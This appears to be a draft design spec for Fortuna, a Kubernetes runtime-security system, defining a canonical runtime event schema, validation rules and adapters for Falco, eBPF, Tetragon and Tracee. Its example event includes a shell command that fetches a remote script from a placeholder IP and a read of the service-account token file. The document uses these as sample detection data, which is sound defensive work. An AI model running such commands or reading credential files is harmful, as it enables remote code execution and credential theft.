# FORTUNA_RUNTIME_EVENT_MODEL.md

## Status
Draft v1.0

## Purpose
This document defines the canonical runtime event model for Fortuna.  
It standardizes runtime telemetry from multiple runtime security sources into a single, source-independent contract.

The model is designed to support:

- runtime evidence persistence
- source-independent behavior analysis
- signal generation
- capability promotion
- risk evaluation
- explainable findings

---

# 1. Goals

## 1.1 Primary Goals
- Define a **canonical RuntimeEventDTO** for all runtime sources.
- Ensure runtime ingestion is **source-agnostic**.
- Provide enough semantic structure for:
  - behavior fact extraction
  - signal synthesis
  - correlation / stateful detectors
  - forensic replay
- Guarantee **stable contract behavior** across agent and core versions.

## 1.2 Non-Goals
- This document does **not** define:
  - runtime signals
  - detector logic
  - risk scoring
  - capability reasoning
- Those are defined in separate documents.

---

# 2. Runtime Event Lifecycle

```mermaid
flowchart TD
  A["Runtime source\n(Falco / eBPF / Tetragon / Tracee)"] --> B["Source Adapter"]
  B --> C["RuntimeEventDTO"]
  C --> D["Agent ingest client"]
  D --> E["Core runtime ingest API"]
  E --> F["runtime_events"]
  Runtime events are the canonical persisted runtime evidence layer.

They are:

immutable
append-only
replayable
source-traceable
3. Canonical RuntimeEventDTO
3.1 Design Principles

The RuntimeEventDTO must be:

normalized: same structure regardless of source
partial-friendly: fields may be absent depending on event type
forensic-safe: preserve source traceability
replay-safe: stable enough for reprocessing
Kubernetes-aware: pod/workload resolution is first-class
3.2 Canonical Schema
{
  "event_id": "uuid",
  "observed_at": "2026-03-26T10:01:02Z",
  "ingested_at": "2026-03-26T10:01:05Z",
  "source": {
    "kind": "falco|ebpf|tetragon|tracee|custom",
    "sensor_id": "node-agent-01",
    "node_name": "worker-01",
    "raw_rule": "Terminal shell in container",
    "raw_category": "process",
    "raw_severity": "warning"
  },
  "resolution": {
    "pod_resolution_state": "resolved|partial|unresolved",
    "container_resolution_state": "resolved|partial|unresolved"
  },
  "k8s": {
    "cluster_id": "prod-cluster",
    "node_name": "worker-01",
    "namespace": "payments",
    "pod_name": "api-5f7f6",
    "pod_uid": "pod-uid",
    "container_id": "containerd://abc",
    "container_name": "app",
    "image": "registry/app:1.2.3",
    "image_id": "sha256:...",
    "workload_kind": "Deployment",
    "workload_name": "payments-api",
    "service_account": "payments-sa",
    "labels": {
      "app": "payments-api",
      "env": "prod"
    }
  },
  "process": {
    "pid": 1234,
    "ppid": 567,
    "tid": 1234,
    "exe": "/bin/sh",
    "cmdline": "/bin/sh -c curl http://x.x.x.x/a.sh",
    "argv": ["/bin/sh", "-c", "curl http://x.x.x.x/a.sh"],
    "cwd": "/tmp",
    "uid": 0,
    "gid": 0,
    "euid": 0,
    "egid": 0,
    "tty": false,
    "session_id": "optional",
    "ancestry": [
      {
        "pid": 567,
        "exe": "/usr/bin/bash"
      },
      {
        "pid": 120,
        "exe": "/app/server"
      }
    ]
  },
  "file": {
    "path": "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "operation": "read|write|exec|create|delete|rename|chmod|chown|mount|unmount",
    "target_type": "file|dir|socket|pipe|device|symlink",
    "old_path": null,
    "new_path": null,
    "mode": "0644",
    "is_sensitive_hint": true
  },
  "network": {
    "direction": "ingress|egress|unknown",
    "protocol": "tcp|udp|icmp|dns|http|https|unknown",
    "src_ip": "10.1.2.3",
    "src_port": 39012,
    "dst_ip": "8.8.8.8",
    "dst_port": 53,
    "dns_query": "example.com",
    "dns_qtype": "A",
    "http_host": null,
    "http_path": null,
    "is_public_dst_hint": true
  },
  "security": {
    "syscall": "openat",
    "privilege_indicator": true,
    "kernel_indicator": false,
    "namespace_indicator": false,
    "capability_indicator": false,
    "sensitive_indicator": true,
    "confidence": "low|medium|high"
  },
  "raw": {
    "payload_hash": "sha256:...",
    "truncated": false,
    "source_event_id": "optional",
    "payload_ref": "optional"
  }
}
4. Schema Semantics
4.1 Top-Level Fields
event_id
Globally unique immutable identifier.
Must be generated at adapter or agent layer if source does not provide one.
observed_at
Time the event occurred on the source node or collector.
Must use RFC3339 UTC.
ingested_at
Time the event was accepted by Fortuna Core.
Assigned by server if not provided.
4.2 source

Contains source provenance and source-native semantics.

Required:
kind
sensor_id
Optional but strongly recommended:
raw_rule
raw_category
raw_severity
Notes:
raw_rule must preserve the original detector/rule name if available.
raw_category should reflect source-native categorization, not Fortuna taxonomy.
4.3 resolution

Tracks how well the event was associated to Kubernetes/container context.

Allowed values:
resolved
partial
unresolved
Purpose:

Avoid dropping otherwise valuable runtime evidence solely due to incomplete metadata resolution.

4.4 k8s

Kubernetes runtime context.

Required when available:
cluster_id
node_name
namespace
pod_name
pod_uid
container_id
Strong requirement:

pod_uid should be treated as the primary asset join key whenever resolvable.

Notes:
labels must be selectively included (bounded allowlist only).
Do not ingest arbitrarily large label maps.
4.5 process

Process execution context.

Required for process-related events:
pid
exe
Recommended:
cmdline
argv
uid/gid
ancestry
Notes:
ancestry should be bounded to avoid payload explosion.
Recommended max depth: 5.
4.6 file

Filesystem context.

Required for file-related events:
path
operation
Notes:
operation must be normalized into Fortuna’s canonical operation set.
Source-native syscall names must not leak into this field directly.
4.7 network

Network context.

Required for network-related events:
protocol
direction
Strongly recommended:
dst_ip
dst_port
Notes:
dns_query is optional and only present when available.
is_public_dst_hint is a convenience hint and must not be treated as source-of-truth for exposure/risk logic.
4.8 security

Security interpretation hints attached at source/adapter time.

Purpose:

Provide low-cost semantics for downstream detectors without overloading the adapter.

Examples:
privilege_indicator = true
sensitive_indicator = true
Important:

These are hints, not final risk conclusions.

4.9 raw

Source traceability and forensic safety.

Required:
payload_hash
Optional:
payload_ref
source_event_id
Notes:

The system should retain enough provenance to:

reconstruct evidence
replay behavior extraction
explain why a signal/insight was generated
5. Required Field Rules

A RuntimeEventDTO is considered valid if:

5.1 Mandatory Top-Level Fields

The following fields must always exist:

event_id
observed_at
source.kind
source.sensor_id
5.2 Minimum Semantic Payload Rule

At least one of the following blocks must be materially populated:

process
file
network
security

If none are present, the event is invalid.

5.3 Kubernetes Association Rule

At least one of the following should be present:

k8s.pod_uid
k8s.container_id
source.node_name

If all are missing, the event may still be accepted only if policy explicitly allows unresolved host-level events.

6. Validation Rules

Validation is split into hard validation and soft validation.

6.1 Hard Validation (Reject)

Reject event if:

event_id missing
observed_at invalid
source.kind missing or unsupported
semantic payload rule fails
malformed JSON
payload exceeds configured size limits
forbidden field types / structural corruption
6.2 Soft Validation (Accept with warnings)

Accept but mark degraded if:

pod_uid unresolved
process ancestry incomplete
network tuple partially missing
file operation unknown but raw syscall exists
labels truncated
payload raw ref unavailable

These conditions should increment ingest quality metrics.

7. Contract Guarantees

Fortuna must guarantee the following for accepted runtime events.

7.1 Immutability

Accepted runtime events are immutable.

No downstream component may mutate the original event payload in place.

7.2 Replay Safety

Runtime events must remain stable enough to support:

behavior fact re-extraction
detector reprocessing
signal backfill
capability replay
7.3 Source Traceability

Every accepted event must retain source provenance.

7.4 Time Ordering Tolerance

The system must tolerate:

delayed delivery
batching delay
out-of-order arrival

No correctness assumption may depend on perfect event ordering.

8. Source Adapter Model

Each source adapter is responsible for converting source-native runtime telemetry into RuntimeEventDTO.

Adapters must:

normalize field names
preserve source provenance
avoid embedding Fortuna-specific risk conclusions
emit partial events if necessary
9. Source Adapter Specifications
9.1 Falco Adapter
Expected Inputs
Falco JSON output
rule name
output fields
priority
container/k8s metadata if present
Typical Mapping
Falco field	RuntimeEventDTO
rule	source.raw_rule
priority	source.raw_severity
evt.time	observed_at
proc.name / proc.exepath	process.exe
proc.cmdline	process.cmdline
fd.name	file.path or network.dst_ip/port
container metadata	k8s.*
Notes

Falco often mixes semantic categories into textual output.
Adapters must normalize into structured fields instead of relying on string parsing downstream whenever possible.

9.2 eBPF / LSM Adapter
Expected Inputs
syscall traces
LSM hooks
kernel execution/file/network events
process lineage if available
Typical Mapping
eBPF concept	RuntimeEventDTO
syscall name	security.syscall
task info	process.*
inode/path	file.*
socket connect	network.*
privilege-sensitive hook	security.privilege_indicator
Notes

eBPF events tend to be lower-level and noisier than Falco.
Adapters should preserve precision and avoid premature semantic over-classification.

9.3 Tetragon Adapter
Expected Inputs
process exec events
kprobe / tracepoint events
policy-triggered events
parent/ancestor process data
Typical Mapping
Tetragon field	RuntimeEventDTO
process execution data	process.*
parent lineage	process.ancestry
file/network action	file.* / network.*
policy name	source.raw_rule
9.4 Tracee Adapter
Expected Inputs
runtime security events
suspicious behavior detections
syscall and event metadata
Typical Mapping
Tracee field	RuntimeEventDTO
eventName	source.raw_rule or security.syscall
process context	process.*
file/network metadata	file.* / network.*
container/k8s metadata	k8s.*
10. Normalization Rules
10.1 Process Normalization
Always prefer absolute executable path if available.
Normalize shell/interpreter paths:
/bin/sh
/bin/bash
/usr/bin/python
/bin/busybox
10.2 File Operation Normalization

Normalize source-native operations into:

read
write
exec
create
delete
rename
chmod
chown
mount
unmount

Unknown operations must map to:

unknown

…but only if raw provenance is preserved elsewhere.

10.3 Network Protocol Normalization

Normalize into:

tcp
udp
icmp
dns
http
https
unknown
10.4 Confidence Normalization

Normalize source confidence into:

low
medium
high
11. Persistence Model
11.1 Table: runtime_events

Recommended storage shape:

event_id
observed_at
ingested_at
cluster_id
node_name
namespace
pod_uid
container_id
source_kind
source_rule
event_domain_hint
payload_json
payload_hash
resolution_state
created_at
11.2 Indexing Recommendations

Recommended indexes:

(cluster_id, observed_at DESC)
(pod_uid, observed_at DESC)
(container_id, observed_at DESC)
(source_kind, observed_at DESC)
(payload_hash)
12. Quality and Contract Metrics

Fortuna should expose runtime ingest quality metrics.

Recommended Metrics
accepted runtime events
rejected runtime events
partially resolved runtime events
unresolved runtime events
source adapter parse failures
payload truncation count
per-source schema degradation count
13. Future Extensions

Potential future additions:

syscall argument arrays
SELinux/AppArmor context
cgroup / namespace IDs
TLS / SNI context
Kubernetes audit event linkage
cloud metadata request semantics

These must be additive and backward-compatible.

14. Summary

The RuntimeEventDTO is the canonical, immutable, source-independent runtime evidence model for Fortuna.

It is the foundation for:

behavior fact extraction
runtime signals
stateful runtime detection
capability inference
runtime-aware risk scoring
explainable findings

If this contract is weak, everything downstream becomes unreliable.
If this contract is stable, the rest of the runtime risk engine can scale cleanly.